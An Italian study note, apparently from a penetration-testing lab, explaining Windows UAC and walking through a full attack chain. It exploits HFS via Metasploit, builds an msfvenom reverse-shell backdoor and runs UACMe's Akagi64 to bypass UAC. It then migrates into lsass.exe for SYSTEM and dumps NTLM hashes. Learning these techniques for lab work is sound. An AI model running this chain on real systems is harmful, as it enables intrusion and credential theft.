Con i sistemi operativi Windows vista in poi è stato introdotto da Microsoft un **Controllo Account Utente (UAC)** ovvero quella finestra che si apre quando un utente apre un programma che potrebbe apportare modifiche al sistema. 

- Un utente che fa parte del gruppo amministrativo non avrai bisogno di credenziali per confermare l’operazione
- Un **utente senza** privilegi di amministrazione avrà **bisogno** di **credenziali** per confermare l’operazione

![image](https://github.com/user-attachments/assets/2d9589cf-e56a-4fa3-bd72-0afb41a03a7c)


### Bypassare UAC con UACMe

E’ un tool utilizzato per l’escaltion di privilegi. Repository ben documentata con **piu di 60 exploit** a seconda della versione Windows https://github.com/hfiref0x/UACME

In particolare consente agli aggressori di eseguire payload su Target Windows

### Exploit

**Enviroment**: Target ha una vulnerabilità http in particolare al servizio **hfs ([HTTP FIle Server](https://github.com/rejetto/hfs)** condivisione di file multimediali) 

[Che cos’è **HTTP File Server (HFS)**](https://www.notion.so/Che-cos-HTTP-File-Server-HFS-190cfd48646780d68acce1431b14ae3e?pvs=21)

1. **use exploit/windows/http/rejetto_hfs_exec** crea una sessione meterpreter sul target
2. **sysinfo** stampa info, se abbiamo un meterpreter sessione x86 dobbiamo passare ad una x64 cosi=
    1. **pgrep explorer** trova l’ID del processo explorer.exe
    2. **migrate ID_EXPLORER.EXE** otteniamo una sessione meterpreter x64
3. **getuid** per vedere che utente siamo
4. **getprivs** stampa a schermo i privilegi dell’utente che siamo ora**getprivs** stampa a schermo i privilegi dell’utente che siamo ora
5. **shell**
6. **net user** mostra gli utenti
7. **net localgroup administrators** stampa a schermo gli utenti che hanno privilegia da administrator
8. **msfvenom -p windows/meterpreter/reverse_tcp LHOST=MIO_IP LPORT=NUMERO_PORTA -f exe > 'backdoor.exe**' crea una backdoor .exe
9. **use exploit/multi/handler** (su di un altro terminale)
    1. set PAYLOAD windows/meterpreter/reverse_tcp
    2. set LHOST 
    3. set LPORT 
    4. run
10. **usciamo da shell ma non dalla sessione meterpreter del primo terminale**
11. **cd C:\\Users\\admin\\AppData\\Local\\Temp** entriamo nell Temp cartella per caricare il 
UACME/Akagi64.exe e la nostra backdoor
12. se non esiste la creiamo noi
    1. cd C:\\
    2. mkdir Temp
13. **scaricare UACME**
14. **upload /root/Desktop/tools/UACME/Akagi64.exe** carichiamo UACME
15. **upload /root/backdoor.exe** carichiamo la backdoor msfvenom
16. Andare sul sito https://github.com/hfiref0x/UACME nella sezione USAGE aprire la finestra Keys e trovare la key della versione del target Window
17. **shell** digitiamo shell nella sessione meterpreter
18. **.\Akagai64.exe KEY_NUMBER C:\PATTERN_BACKDOOR** nell’esempio usiamo il key 23 e otteniamo una backdoor sul terminale in ascolto
19. **ps** mostra i processi, dovremo identificare uno con NT AUTHORITY SYSTEM e migrarci
20. **migrate PID** nell’esempio utilizza il processo lsass.exe per scalare i provilegi
21. **getuid** verifichiamo di essere il Kernel 
22. **hashdump** mostra **NTLM Hash** degli utenti
